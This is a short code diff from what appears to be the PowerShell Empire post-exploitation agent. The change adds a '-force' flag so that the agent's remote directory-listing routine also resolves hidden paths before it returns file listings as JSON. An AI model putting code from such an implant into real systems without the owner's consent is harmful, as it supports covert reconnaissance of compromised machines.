@@ -913,7 +913,7 @@ function Invoke-Empire {
                     $array = @()
                     Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) }
                     Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) }
-                    $directory = Get-Item -Path $path # this way we always get the backslashes even if user supplied forward slashes
+                    $directory = Get-Item -force -Path $path # this way we always get the backslashes even if user supplied forward slashes
                     $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress
 
                     if ($directory -eq $null)
